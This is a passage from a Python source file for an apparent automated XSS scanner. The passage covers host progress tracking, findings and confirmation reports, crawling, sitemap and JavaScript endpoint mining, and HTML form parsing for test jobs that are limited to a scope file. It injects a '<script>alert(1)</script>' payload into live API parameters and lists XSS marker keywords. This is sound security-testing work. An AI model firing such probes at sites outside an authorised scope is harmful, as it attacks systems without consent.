        complete = False
    hosts_done = 0
    try:
        with open(os.path.join(parent_dir, "hosts-done.txt"), encoding="utf-8") as fh:
            hosts_done = sum(1 for _ in fh)
    except OSError:
        pass
    src_fail_sum = sum(1 for p in parts.values() if p.get("discovery_failed"))
    forms_fail_sum = sum(int(p.get("forms_failed") or 0) for p in parts.values())
    out = {
        "generated": now(),
        "discovery_failed_sources": src_fail_sum,
        "forms_pages_failed": forms_fail_sum,
        "mode": "per-host",
        "parts": parts,
        "hosts_done": hosts_done,
        "findings": sum(1 for _ in open(os.path.join(parent_dir, "results.jsonl"),
                                        encoding="utf-8", errors="replace"))
        if os.path.exists(os.path.join(parent_dir, "results.jsonl")) else 0,
        "confirmed": sum(1 for _ in open(os.path.join(parent_dir, "confirmed.jsonl"),
                                         encoding="utf-8", errors="replace"))
        if os.path.exists(os.path.join(parent_dir, "confirmed.jsonl")) else 0,
        "complete": complete,
    }
    with open(cov_parent, "w", encoding="utf-8") as fh:
        json.dump(out, fh, separators=(",", ":"))
    print("[*] merge: +%d finding(s), +%d confirmed, +%d host(s) done, +%d url(s)"
          % (res, conf, hosts, urls_done), file=sys.stderr)
    print("%d/%d" % (hosts_done, hosts_done))
    return 0


def cmd_host_status(db, hosts_file, done_file, log_file="", urls_done_file=""):
    """Track which domains have no outstanding work left.

    A host is 'complete' once every URL and job that belongs to it is done and
    nothing is pending/running/failed. Writes the completed list plus a
    timestamped log of newly finished domains, and prints a progress line.
    """
    try:
        hosts = [h.strip().lower() for h in open(hosts_file, encoding="utf-8")
                 if h.strip()]
    except OSError:
        return 1
    c = connect(db)
    ensure(c)
    order = {}
    for i, h in enumerate(hosts):
        order.setdefault(_host_key(h), i)
    scope = set(order)
    pending = {}
    done = {}
    for url, state in c.execute("SELECT url,state FROM urls"):
        h = _host_key(url)
        if h not in scope:
            continue
        if state in ("done",):
            done[h] = done.get(h, 0) + 1
        else:
            pending[h] = pending.get(h, 0) + 1
    for target, state, kind in c.execute("SELECT target,state,kind FROM jobs"):
        h = _host_key(target)
        if h not in scope:
            continue
        if state != "done":
            pending[h] = pending.get(h, 0) + 1
        else:
            done[h] = done.get(h, 0) + 1
    completed = sorted((h for h in scope if not pending.get(h)
                        and done.get(h)), key=lambda h: order.get(h, 0))
    running = [h for h in scope if pending.get(h)]
    untouched = [h for h in scope if not pending.get(h) and not done.get(h)]
    try:
        with open(done_file, "w", encoding="utf-8") as fh:
            for h in completed:
                fh.write(h + "\n")
    except OSError:
        pass
    if log_file:
        seen = set()
        try:
            with open(log_file, encoding="utf-8") as fh:
                for line in fh:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        seen.add(parts[-1])
        except OSError:
            pass
        new = [h for h in completed if h not in seen]
        if new:
            with open(log_file, "a", encoding="utf-8") as fh:
                for h in new:
                    fh.write("%s %s\n" % (now(), h))
    if urls_done_file:
        done_urls = []
        for url, state in c.execute("SELECT url,state FROM urls WHERE state='done'"):
            done_urls.append(url)
        try:
            prev = int(meta_get(c, "urls_done_count", "-1") or -1)
        except Exception:
            prev = -1
        if len(done_urls) != prev or not os.path.exists(urls_done_file):
            done_urls.sort()
            tmp = urls_done_file + ".tmp"
            try:
                with open(tmp, "w", encoding="utf-8") as fh:
                    for u in done_urls:
                        fh.write(u + "\n")
                os.replace(tmp, urls_done_file)
                meta_set(c, "urls_done_count", len(done_urls))
            except OSError:
                pass

    print("[*] hosts complete: %d/%d (in progress %d, not started %d)"
          % (len(completed), len(scope), len(running), len(untouched)),
          file=sys.stderr)
    print("%d/%d" % (len(completed), len(scope)))
    return 0


def cmd_show_findings(db, label="findings"):
    """Print findings added since the last call, one per line.

    Used by --silent so a hit appears the moment its batch commits, while the
    rest of the scan keeps running.
    """
    c = connect(db)
    ensure(c)
    try:
        last = int(meta_get(c, "shown_finding_id", "0") or 0)
    except Exception:
        last = 0
    rows = c.execute(
        "SELECT id,template_id,url,COALESCE(param,'') FROM findings"
        " WHERE id > ? ORDER BY id", (last,)).fetchall()
    for rid, tid, url, param in rows:
        p = (" param=" + param) if param else ""
        print("[+] XSS %s: %s%s  [%s]" % (label, url, p, tid), flush=True)
    if rows:
        meta_set(c, "shown_finding_id", rows[-1][0])
    return 0


def _host_path(url):
    from urllib.parse import urlsplit, unquote
    try:
        sp = urlsplit(url.split("#")[0])
        segs = sp.path.split("/")
        keep = []
        for seg in segs:
            low = unquote(seg).lower()
            if any(m in low for m in ("<", "alert(", "onerror", "onmouseover", "svg", "script")):
                break
            keep.append(seg)
        path = "/".join(keep) or "/"
        if len(keep) < len(segs):
            path = path.rstrip("/") + "/*"
        return sp.netloc.lower(), path
    except Exception:
        return url, "/"


def cmd_escaped_report(db, out_file):
    """Findings whose payload was reflected but entity/JS-escaped.

    Not vulnerabilities: they show the sink exists and the app encodes it.
    """
    c = connect(db)
    ensure(c)
    rows = c.execute(
        "SELECT DISTINCT url, COALESCE(param,''), template_id FROM findings"
        " WHERE context='escaped' ORDER BY id").fetchall()
    if not rows:
        return 1
    with open(out_file, "w", encoding="utf-8") as fh:
        fh.write("REFLECTED BUT ESCAPED - not XSS, markup was encoded (%d)\n\n" % len(rows))
        for url, param, tid in rows:
            fh.write("ESCAPED %s\n" % url)
            if param:
                fh.write("    param=%s\n" % param)
    print(len(rows))
    return 0


def cmd_new_candidates(db, out_file, marker_file="cand-notified.id", key_file=""):
    """Reportable URL candidates (context=html) added since the last marker.

    Used for notifications so filtered contexts (JSON blobs, escaped text,
    non-HTML responses, 404s) never reach Discord.
    """
    c = connect(db)
    ensure(c)
    last = 0
    try:
        with open(marker_file, encoding="utf-8") as fh:
            last = int(fh.read().strip() or 0)
    except Exception:
        last = 0
    seen = set()
    if key_file and os.path.exists(key_file):
        try:
            with open(key_file, encoding="utf-8") as fh:
                seen = {l.strip() for l in fh if l.strip()}
        except OSError:
            pass
    rows = c.execute(
        "SELECT id,url,COALESCE(param,''),template_id FROM findings"
        " WHERE context='html' AND id > ? ORDER BY id", (last,)).fetchall()
    lines, keys = [], []
    top = last
    host_key_cache = {}
    for fid, url, param, tid in rows:
        top = fid
        host, path = host_key_cache.get(url) or _host_path(url)
        host_key_cache[url] = (host, path)
        key = "cand|%s|%s|%s" % (host, path, param)
        if key in seen or key in keys:
            continue
        keys.append(key)
        lines.append("GET %s" % url)
        if param:
            lines.append("    param=%s" % param)
    try:
        with open(marker_file, "w", encoding="utf-8") as fh:
            fh.write(str(top))
    except OSError:
        pass
    if not keys:
        return 1
    with open(out_file, "w", encoding="utf-8") as fh:
        fh.write("XSS CANDIDATES — not confirmed, verify manually (%d)\n\n" % len(keys))
        fh.write("\n".join(lines[:60]) + "\n")
        if len(lines) > 60:
            fh.write("... %d more\n" % (len(lines) - 60))
    if key_file:
        try:
            with open(key_file + ".pending", "a", encoding="utf-8") as fh:
                for k in keys:
                    fh.write(k + "\n")
        except OSError:
            pass
    print(len(keys))
    return 0


def cmd_api_reflect(db, out_file, limit="300"):
    """Report payload echoes from API-style endpoints (JSON/text responses).

    These are NOT XSS by themselves: the browser will not execute them. They are
    recorded for manual review because a SPA may render the value client-side.
    """
    import urllib.parse as up
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] api-reflect: scope policy missing", file=sys.stderr)
        return 2
    try:
        cap = int(limit)
    except Exception:
        cap = 300
    c = connect(db)
    ensure(c)
    seen, lines, n = set(), [], 0
    rows = c.execute("SELECT url FROM urls ORDER BY id").fetchall()
    payload = "<script>alert(1)</script>"
    for (url,) in rows:
        if n >= cap:
            break
        if "/api/" not in url and "/rest/" not in url:
            continue
        sp = up.urlsplit(url)
        pairs = up.parse_qsl(sp.query, keep_blank_values=True)
        if not pairs:
            continue
        if url in seen:
            continue
        seen.add(url)
        target = up.urlunsplit((sp.scheme, sp.netloc, sp.path,
                                up.urlencode([(pairs[0][0], payload)]), sp.fragment))
        n += 1
        res = http_request(target, allowed, "GET")
        if res["error"] or not res["body"]:
            continue
        body = res["body"]
        hit = payload in body or "alert(1)" in body
        if not hit:
            continue
        ctype = (res["ctype"] or "").split(";")[0] or "?"
        lines.append("REFLECT %s param=%s ctype=%s status=%s"
                     % (sp.path, pairs[0][0], ctype, res["status"]))
        lines.append("    %s" % target)
    if lines:
        with open(out_file, "w", encoding="utf-8") as fh:
            fh.write("API REFLECTIONS — not XSS, manual DOM review (%d)\n\n"
                     % (len(lines) // 2))
            fh.write("\n".join(lines) + "\n")
        print(len(lines) // 2)
        return 0
    return 1


def cmd_confirmed_new(db, out_file, marker_file="confirmed-notified.id", key_file=""):
    """Confirmed attempts not yet notified, one line per endpoint+parameter.

    Dedupe keys are written to key_file.pending and only committed by the caller
    after a successful send, so a failed delivery can be retried.
    """
    c = connect(db)
    ensure(c)
    last = 0
    try:
        with open(marker_file, encoding="utf-8") as fh:
            last = int(fh.read().strip() or 0)
    except Exception:
        last = 0
    seen = set()
    if key_file:
        try:
            with open(key_file, encoding="utf-8") as fh:
                seen = {l.strip() for l in fh if l.strip()}
        except OSError:
            pass
    rows = c.execute(
        "SELECT a.id, a.candidate, COALESCE(a.param_name,'') FROM attempts a"
        " WHERE a.state='confirmed' AND a.id > ? ORDER BY a.id", (last,)).fetchall()
    lines, keys = [], []
    top = last
    for rid, cand, pname in rows:
        top = rid
        host, path = _host_path(cand)
        key = "conf|%s|%s|%s" % (host, path, pname)
        if key in seen or key in keys:
            continue
        keys.append(key)
        lines.append("CONFIRMED %s" % cand)
        if pname:
            lines.append("    param=%s" % pname)
    try:
        with open(marker_file, "w", encoding="utf-8") as fh:
            fh.write(str(top))
    except OSError:
        pass
    if not keys:
        return 1
    with open(out_file, "w", encoding="utf-8") as fh:
        fh.write("XSS CONFIRMED — execution proven (exec-proof) (%d)\n\n" % len(keys))
        fh.write("\n".join(lines) + "\n")
    if key_file:
        try:
            with open(key_file + ".pending", "a", encoding="utf-8") as fh:
                for k in keys:
                    fh.write(k + "\n")
        except OSError:
            pass
    print(len(keys))
    return 0


def cmd_show_confirmed(db, label="confirmed"):
    """Print attempts confirmed since the last call (post headless execution)."""
    c = connect(db)
    ensure(c)
    try:
        last = int(meta_get(c, "shown_attempt_id", "0") or 0)
    except Exception:
        last = 0
    rows = c.execute(
        "SELECT a.id,a.candidate,COALESCE(a.param_name,''),a.injected"
        " FROM attempts a WHERE a.state='confirmed' AND a.id > ? ORDER BY a.id",
        (last,)).fetchall()
    for rid, cand, pname, injected in rows:
        p = (" param=" + pname) if pname else ""
        print("[+] XSS %s: %s%s  [exec-proof ok]" % (label, cand, p), flush=True)
    if rows:
        meta_set(c, "shown_attempt_id", rows[-1][0])
    return 0


def cmd_harvest(host, depth="2", max_pages="150"):
    """Small, polite crawler used when katana gets throttled.

    Single-threaded, one request per second, depth-limited. Prints every
    discovered absolute URL (fetched or merely linked) for `ingest`.
    """
    import time as _time
    from urllib.parse import urljoin
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] harvest: scope policy missing", file=sys.stderr)
        return 2
    try:
        depth = int(depth)
    except Exception:
        depth = 2
    try:
        cap = int(max_pages)
    except Exception:
        cap = 150
    host = (host or "").strip()
    if not host:
        return 1
    link_re = re.compile(r"(?:href|src|action)\s*=\s*[\"']([^\"'#][^\"']*)[\"']", re.I)
    discovered = set()
    queue = [("https://" + host + "/", 0), ("http://" + host + "/", 0)]
    fetched = 0
    while queue and fetched < cap:
        url, d = queue.pop(0)
        key = url.split("#")[0]
        if key in discovered and d == 0:
            continue
        discovered.add(key)
        if not in_scope(key, allowed):
            continue
        res = http_request(key, allowed, "GET")
        fetched += 1
        _time.sleep(1.0)
        if res.get("redirect"):
            # directory URLs often 301 to the slash form; that page holds the links
            loc = res["redirect"]
            try:
                nxt = urljoin(key, loc)
            except Exception:
                nxt = ""
            if nxt and nxt not in discovered:
                discovered.add(nxt)
                queue.append((nxt, d))
            continue
        if res["error"] or "html" not in (res["ctype"] or "").lower():
            continue
        if d >= depth:
            continue
        for raw in link_re.findall(res["body"])[:80]:
            u = urljoin(key, raw.strip())
            if not u.startswith(("http://", "https://")):
                continue
            if re.search(r"\.(?:png|jpe?g|gif|svg|ico|css|woff2?|ttf|eot|mp4|webp|avif|pdf)$",
                         u, re.I):
                continue
            u = u.split("#")[0]
            discovered.add(u)
            if "?" in u:
                continue
            if u not in [q[0] for q in queue]:
                queue.append((u, d + 1))
    for u in sorted(discovered):
        if in_scope(u, allowed):
            print(u)
    print("[*] harvest: %d request(s), %d url(s)" % (fetched, len(discovered)), file=sys.stderr)
    return 0


def cmd_url_count(db):
    c = connect(db)
    ensure(c)
    n = c.execute("SELECT COUNT(*) FROM urls").fetchone()[0]
    print(n)
    return 0


def cmd_sitemap_parse(*files):
    """Extract URLs from robots.txt / sitemap.xml dumps.

    stdin is not used: the caller passes file paths, so large sitemaps stay on
    disk only long enough to be parsed once.
    """
    lo = re.compile(r"<loc>\s*([^<\s]+)\s*</loc>", re.I)
    sm = re.compile(r"(?im)^\s*sitemap:\s*(\S+)\s*$")
    out = []
    for path in files:
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                body = fh.read(4000000)
        except OSError:
            continue
        found = lo.findall(body) + sm.findall(body)
        for u in found:
            u = u.strip().replace("&amp;", "&")
            if u.startswith("//"):
                u = "https:" + u
            if not u.startswith(("http://", "https://")):
                continue
            out.append(u)
    seen = set()
    for u in out:
        if u in seen:
            continue
        seen.add(u)
        print(u)
    return 0


def cmd_list_js(db, out_file):
    """Distinct in-scope .js/.mjs URLs discovered so far, for JS endpoint mining."""
    c = connect(db)
    ensure(c)
    seen = set()
    rows = []
    for (u,) in c.execute("SELECT url FROM jsurls ORDER BY url"):
        base = u.split("?", 1)[0]
        if base in seen:
            continue
        seen.add(base)
        rows.append(base)
    for (u,) in c.execute("SELECT url FROM urls ORDER BY id"):
        base = u.split("?", 1)[0]
        if not base.lower().endswith((".js", ".mjs")):
            continue
        if base in seen:
            continue
        seen.add(base)
        rows.append(base)
    with open(out_file, "w", encoding="utf-8") as fh:
        for u in rows:
            fh.write(u + "\n")
    print(len(rows))


_JS_URL_RE = re.compile(r"""https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%\-]+""")
_JS_PATH_RE = re.compile(r"""["'`](/[A-Za-z0-9._~!$&()*+,;=:@%\-/]{2,}(?:\?[^"'`\\\s]{0,300})?)["'`]""")
_JS_SKIP_RE = re.compile(r"""\.(?:png|jpe?g|gif|svg|ico|css|map|woff2?|ttf|eot|mp4|webp|avif|pdf|zip|gz)(?:[?#]|$)""", re.I)


def cmd_js_extract(js_dir, limit="0"):
    """Mine endpoint candidates out of downloaded JS bundles.

    Each file starts with a '#SRC <url>' line so relative paths can be resolved
    against the script's own origin. Results are printed as absolute URLs for
    `ingest` to scope-check like any other discovery source.
    """
    from urllib.parse import urljoin, urlsplit
    import glob as _glob

    cap = 0
    try:
        cap = int(limit or 0)
    except Exception:
        cap = 0
    out = set()
    files = sorted(_glob.glob(os.path.join(js_dir, "*")))
    for path in files:
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                first = fh.readline().strip()
                body = fh.read()
        except Exception:
            continue
        if not first.startswith("#SRC "):
            continue
        src = first[5:].strip()
        try:
            parts = urlsplit(src)
        except Exception:
            continue
        if parts.scheme not in ("http", "https") or not parts.netloc:
            continue
        origin = parts.scheme + "://" + parts.netloc
        for m in _JS_URL_RE.finditer(body):
            u = m.group(0)
            if len(u) > 500 or _JS_SKIP_RE.search(u):
                continue
            if "\\u0026" in u or "\\u003d" in u:
                continue  # JSON-escaped query separators are not real literals
            u = u.replace("&amp;", "&").replace("&#38;", "&")
            out.add(u)
        for m in _JS_PATH_RE.finditer(body):
            raw = m.group(1)
            if len(raw) > 500 or _JS_SKIP_RE.search(raw):
                continue
            if "\\u0026" in raw or raw.endswith("&amp"):
                continue
            raw = raw.replace("&amp;", "&").replace("&#38;", "&")
            u = urljoin(origin, raw)
            # drop artifact params produced by minified HTML fragment strings
            if re.search(r"[?&](amp|lt|gt|quot|nbsp)(=|&|$)", u):
                continue
            out.add(u)
    rows = sorted(out)
    if cap > 0 and len(rows) > cap:
        rows = rows[:cap]
    for u in rows:
        print(u)
    print("[*] js-extract: %d file(s), %d unique candidate(s)" % (len(files), len(rows)),
          file=sys.stderr)
    return 0


def cmd_path_plan(db, target_file):
    c = connect(db)
    ensure(c)
    added = dropped = 0
    with open(target_file, encoding="utf-8", errors="replace") as fh:
        c.execute("BEGIN IMMEDIATE")
        for line in fh:
            t = line.strip()
            if not t:
                continue
            room = _jobs_room(c)
            state = "deferred" if (room is not None and room <= 0) else "pending"
            before = c.total_changes
            c.execute("INSERT OR IGNORE INTO jobs(kind,target,state) VALUES('path',?,?)",
                      (t, state))
            if c.total_changes - before:
                added += 1
                if state == "deferred":
                    dropped += 1
        c.execute("COMMIT")
    print("[*] path jobs queued: %d, dropped by cap: %d" % (added, dropped), file=sys.stderr)


def cmd_path_batch(db, n, out_file):
    _claim(db, ["path"], n, out_file)


def cmd_body_batch(db, n, out_file):
    _claim(db, ["form", "json"], n, out_file)


def cmd_path_commit(db, id_file, jsonl_file):
    c = connect(db)
    ensure(c)
    ids = _ids(id_file)
    try:
        rows, _ = _findings_from(jsonl_file, strict=True)
    except OutputError as exc:
        print("[-] path-commit rejected: %s" % exc, file=sys.stderr)
        return 1
    try:
        c.execute("BEGIN IMMEDIATE")
        added = _insert_findings(c, rows, _config_id(c))
        c.executemany("UPDATE jobs SET state='done' WHERE id=?", [(i,) for i in ids])
        c.execute("COMMIT")
    except Exception as exc:
        try:
            c.execute("ROLLBACK")
        except Exception:
            pass
        print("[-] path-commit failed: %s" % exc, file=sys.stderr)
        return 1
    print("[*] path committed: %d job(s), %d new" % (len(ids), added), file=sys.stderr)
    return 0


def cmd_body_commit(db, id_file, jsonl_file, rc="0"):
    c = connect(db)
    ensure(c)
    ids = _ids(id_file)
    if int(rc) != 0:
        print("[-] body-commit rejected: probe rc=%s (requests failed)" % rc,
              file=sys.stderr)
        return 1
    try:
        rows, _ = _findings_from(jsonl_file, strict=True)
    except OutputError as exc:
        print("[-] body-commit rejected: %s" % exc, file=sys.stderr)
        return 1
    try:
        c.execute("BEGIN IMMEDIATE")
        added = _insert_findings(c, rows, _config_id(c))
        c.executemany("UPDATE jobs SET state='done' WHERE id=?", [(i,) for i in ids])
        c.execute("COMMIT")
    except Exception as exc:
        try:
            c.execute("ROLLBACK")
        except Exception:
            pass
        print("[-] body-commit failed: %s" % exc, file=sys.stderr)
        return 1
    print("[*] body committed: %d job(s), %d new" % (len(ids), added), file=sys.stderr)
    return 0


def _abort_jobs(db, id_file, msg):
    c = connect(db)
    ensure(c)
    ids = _ids(id_file)
    c.execute("BEGIN IMMEDIATE")
    c.executemany("UPDATE jobs SET state='failed', tries=tries+1 WHERE id=?",
                  [(i,) for i in ids])
    c.execute("COMMIT")
    print("[*] %s: %d job(s) -> failed" % (msg, len(ids)), file=sys.stderr)


def cmd_path_abort(db, id_file, rc="0"):
    _abort_jobs(db, id_file, "path abort")


def cmd_body_abort(db, id_file, rc="0"):
    _abort_jobs(db, id_file, "body abort")


# ------------------------------------------------------------- body discovery
class FormParser(HTMLParser):
    """Preserves ordered fields incl. duplicate names, textarea text, selected options."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
        self.textarea = None
        self.select = None
        self.option = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self.cur = {"action": a.get("action") or "",
                        "method": (a.get("method") or "get").lower(), "fields": []}
            self.forms.append(self.cur)
            return
        if self.cur is None:
            return
        if "disabled" in a:
            return
        if tag == "textarea":
            self.textarea = {"name": a.get("name"), "value": ""}
            if self.textarea["name"]:
                self.cur["fields"].append([self.textarea["name"], ""])
                self.textarea["idx"] = len(self.cur["fields"]) - 1
            return
        if tag == "select":
            self.select = {"name": a.get("name"), "value": "", "idx": None,
                           "multiple": "multiple" in a, "values": []}
            if self.select["name"]:
                self.cur["fields"].append([self.select["name"], ""])
                self.select["idx"] = len(self.cur["fields"]) - 1
            return
        if tag == "option" and self.select is not None:
            val = a.get("value")
            self.option = {"value": "" if val is None else val,
                           "selected": "selected" in a}
            return
        if tag != "input":
            return
        name = a.get("name")
        if not name:
            return
        typ = (a.get("type") or "text").lower()
        if typ in ("submit", "button", "image", "reset", "file"):
            return
        val = a.get("value") or ""
        if typ in ("checkbox", "radio"):
            if "checked" not in a:
                return
            if val == "":
                val = "on"
        self.cur["fields"].append([name, val])

    def handle_data(self, data):
        if self.textarea is not None and self.textarea.get("name"):
            self.textarea["value"] += data
            self.cur["fields"][self.textarea["idx"]][1] = self.textarea["value"]
            return
        if self.option is not None and self.select is not None:
            if not self.option["value"]:
                self.option["value"] = data.strip()

    def handle_endtag(self, tag):
        if tag == "textarea":
            self.textarea = None
        elif tag == "select":
            if self.select is not None and self.select.get("name"):
                if self.select["multiple"] and self.select["values"]:
                    # multiple-select: keep the primary slot, append the rest
                    self.cur["fields"][self.select["idx"]][1] = self.select["values"][0]
                    for extra in self.select["values"][1:]:
                        self.cur["fields"].append([self.select["name"], extra])
                elif not self.cur["fields"][self.select["idx"]][1]:
                    self.cur["fields"][self.select["idx"]][1] = self.select["value"]
            self.select = None
        elif tag == "option":
            if self.option is not None and self.select is not None and self.option["selected"]:
                if self.select.get("multiple"):
                    self.select["values"].append(self.option["value"])
                elif self.select.get("name"):
                    self.cur["fields"][self.select["idx"]][1] = self.option["value"]
            self.option = None
        elif tag == "form":
            self.cur = None


def cmd_form_plan(db, pages_file, max_pages="200"):
    c = connect(db)
    ensure(c)
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] form-plan: scope file missing/empty (XSS_SCOPE_HOSTS)", file=sys.stderr)
        return 2
    max_pages = int(max_pages)
    all_pages = [l.strip() for l in open(pages_file, encoding="utf-8", errors="replace")
                 if l.strip()]
    rediscover = os.environ.get("FORMS_REDISCOVER", "0") == "1"
    done = set() if rediscover else {
        k for (k,) in c.execute("SELECT key FROM discovery"
                                " WHERE source='forms' AND status='done'")}
    stale = [k for (k,) in c.execute(
        "SELECT key FROM discovery WHERE source='forms' AND status='processing'")]
    todo = stale + [p for p in all_pages if p not in done and p not in stale]
    skipped = max(0, len(todo) - max_pages) if max_pages else 0
    pages = todo[:max_pages] if max_pages else todo
    # auto budget: user should not have to size --form-max by hand.
    # pages that do not fit are written to a resume file, not dropped.
    qfile = os.environ.get("FORMS_QUEUE_FILE", "")
    if qfile and os.path.exists(qfile):
        try:
            queued = [l.strip() for l in open(qfile, encoding="utf-8", errors="replace") if l.strip()]
            if queued:
                pages = queued
        except Exception:
            pass
    budget = float(os.environ.get("FORMS_BUDGET", "0") or 0)
    if budget <= 0:
        budget = min(1800.0, max(120.0, 20.0 + 0.5 * len(pages)))
    started = time.time()
    added = rejected = errors = dropped = 0
    allow_post = os.environ.get("FORMS_POST", "0") == "1"
    deferred = []
    for idx, page in enumerate(pages):
        if time.time() - started > budget:
            deferred = pages[idx:]
            for p in deferred:
                c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                          " VALUES('forms',?,'partial',124,?) ON CONFLICT(source,key)"
                          " DO UPDATE SET status='partial', rc=124, ts=excluded.ts",
                          (p, now()))
            skipped += len(deferred)
            print("[*] form-plan: time budget %.0fs reached, %d page(s) queued for resume"
                  % (budget, len(deferred)), file=sys.stderr)
            break
        c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                  " VALUES('forms',?,'processing',0,?) ON CONFLICT(source,key) DO UPDATE SET"
                  " status='processing', ts=excluded.ts", (page, now()))
        res = http_request(page, allowed)
        if res["error"] or res["status"] != 200:
            # transient throttling/5xx is common on CGI hosts: one retry
            time.sleep(1.0)
            res = http_request(page, allowed)
        if res["error"] or res["status"] != 200:
            errors += 1
            c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                      " VALUES('forms',?,?,?,?) ON CONFLICT(source,key) DO UPDATE SET"
                      " status=excluded.status, rc=excluded.rc, ts=excluded.ts",
                      (page, "failed", res["status"] or 1, now()))
            continue
        if "html" not in (res["ctype"] or "").lower() or "<form" not in res["body"].lower():
            c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                      " VALUES('forms',?,'done',0,?) ON CONFLICT(source,key) DO UPDATE SET"
                      " status='done', rc=0, ts=excluded.ts", (page, now()))
            continue
        fp = FormParser()
        try:
            fp.feed(res["body"])
        except Exception:
            errors += 1
            c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                      " VALUES('forms',?,'parse_error',1,?) ON CONFLICT(source,key)"
                      " DO UPDATE SET status='parse_error', rc=1, ts=excluded.ts",
                      (page, now()))
            continue
        for form in fp.forms:
            fields = form["fields"][:MAX_BODY_PARAMS]
            if not fields:
                continue
            action = urllib.parse.urljoin(page, form["action"] or page)
            if not in_scope(action, allowed):
                rejected += 1
                continue
            method = form["method"].upper()
            if method == "POST" and not allow_post:
                continue  # state-changing by default: opt in with --forms-post
            # CGI endpoints often accept parameters that never appear as inputs;
            # add a bounded set of likely names so hidden params (e.g. p=) get tested
            path_l = urlsplit(action).path.lower()
            if path_l.endswith(".cgi") and len(fields) < 3:
                have = {n for n, _ in fields}
                for cp in COMMON_PARAMS:
                    if cp not in have and len(fields) < 10:
                        fields.append([cp, "1"])
                        have.add(cp)
            spec = {"method": method, "url": action, "kind": "form",
                    "fields": fields}
            job_specs = [spec]
            if method == "GET" and allow_post and path_l.endswith(".cgi"):
                # many CGIs accept the same parameters over POST; the reported
                # bugs are frequently POST-only, so test both
                job_specs.append({"method": "POST", "url": action, "kind": "form",
                                  "fields": fields})
            for spec in job_specs:
                room = _jobs_room(c)
                state = "deferred" if (room is not None and room <= 0) else "pending"
                c.execute("BEGIN IMMEDIATE")
                before = c.total_changes
                c.execute("INSERT OR IGNORE INTO jobs(kind,target,state) VALUES(?,?,?)",
                          ("form", json.dumps(spec, sort_keys=True), state))
                if c.total_changes - before:
                    added += 1
                    if state == "deferred":
                        dropped += 1
                c.execute("COMMIT")
        # ---- JS-derived endpoints: forms built at runtime (document.form.field.value) ----
        js_names = set()
        cgi_paths = set()
        for m in re.finditer(r"document\.([A-Za-z0-9_$]+)\.([A-Za-z0-9_$]+)\.value",
                             res["body"]):
            js_names.add(m.group(2))
            window = res["body"][max(0, m.start() - 800):m.end() + 800]
            for p in re.finditer(r"[\"'](/[^\"']*?\.cgi)[^\"']*[\"']", window):
                cgi_paths.add(p.group(1))
        if js_names and cgi_paths:
            for path in sorted(cgi_paths)[:3]:
                action = urllib.parse.urljoin(page, path)
                if not in_scope(action, allowed):
                    continue
                methods = (("POST",) if allow_post else ()) + ("GET",)
                for method in methods:
                    spec = {"method": method, "url": action, "kind": "form",
                            "fields": [[n, "1"] for n in sorted(js_names)][:MAX_BODY_PARAMS],
                            "source": "js-derived"}
                    room = _jobs_room(c)
                    state = "deferred" if (room is not None and room <= 0) else "pending"
                    c.execute("BEGIN IMMEDIATE")
                    before = c.total_changes
                    c.execute("INSERT OR IGNORE INTO jobs(kind,target,state) VALUES(?,?,?)",
                              ("form", json.dumps(spec, sort_keys=True), state))
                    if c.total_changes - before:
                        added += 1
                        if state == "deferred":
                            dropped += 1
                    c.execute("COMMIT")
        # page completion only after its forms are durably queued
        c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                  " VALUES('forms',?,'done',0,?) ON CONFLICT(source,key) DO UPDATE SET"
                  " status='done', rc=0, ts=excluded.ts", (page, now()))
    for page in todo[ (max_pages if max_pages else len(todo)) : ]:
        c.execute("INSERT INTO discovery(source,key,status,rc,ts)"
                  " VALUES('forms',?,'partial',?,?) ON CONFLICT(source,key) DO UPDATE SET"
                  " status='partial', rc=excluded.rc, ts=excluded.ts",
                  (page, 0, now()))
    c.execute("INSERT INTO discovery(source,key,status,rc,ts) VALUES('forms','pages',?,?,?)"
              " ON CONFLICT(source,key) DO UPDATE SET status=excluded.status,"
              " rc=excluded.rc, ts=excluded.ts",
              ("done" if skipped == 0 else "partial", skipped, now()))
    meta_set(c, "forms_skipped", skipped)
    if qfile:
        try:
            if deferred:
                with open(qfile, "w", encoding="utf-8") as fh:
                    fh.write("\n".join(deferred) + "\n")
            elif os.path.exists(qfile):
                os.remove(qfile)
        except Exception:
            pass
    print("[*] form-plan: %d job(s), %d out-of-scope action(s) rejected, "
          "%d page error(s), %d page(s) skipped, %d dropped by cap"
          % (added, rejected, errors, skipped, dropped), file=sys.stderr)
    if errors:
        return 3
    return 0


def cmd_json_plan(db, spec_file):
    c = connect(db)
    ensure(c)
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] json-plan: scope file missing/empty (XSS_SCOPE_HOSTS)", file=sys.stderr)
        return 2
    added = rejected = bad = dropped = 0
    with open(spec_file, encoding="utf-8", errors="replace") as fh:
        for lineno, line in enumerate(fh, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                spec = json.loads(line)
            except Exception:
                bad += 1
                print("[-] json-plan: malformed spec at line %d" % lineno, file=sys.stderr)
                continue
            spec.setdefault("kind", "json")
            spec.setdefault("method", "POST")
            url = spec.get("url")
            if not url or not in_scope(url, allowed):
                rejected += 1
                continue
            if spec["method"].upper() not in ("POST", "PUT", "PATCH"):
                spec["method"] = "POST"
            room = _jobs_room(c)
            state = "deferred" if (room is not None and room <= 0) else "pending"
            c.execute("BEGIN IMMEDIATE")
            before = c.total_changes
            c.execute("INSERT OR IGNORE INTO jobs(kind,target,state) VALUES(?,?,?)",
                      ("json", json.dumps(spec, sort_keys=True), state))
            if c.total_changes - before:
                added += 1
                if state == "deferred":
                    dropped += 1
            c.execute("COMMIT")
    c.execute("INSERT INTO discovery(source,key,status,rc,ts) VALUES('json','specs',?,?,?)"
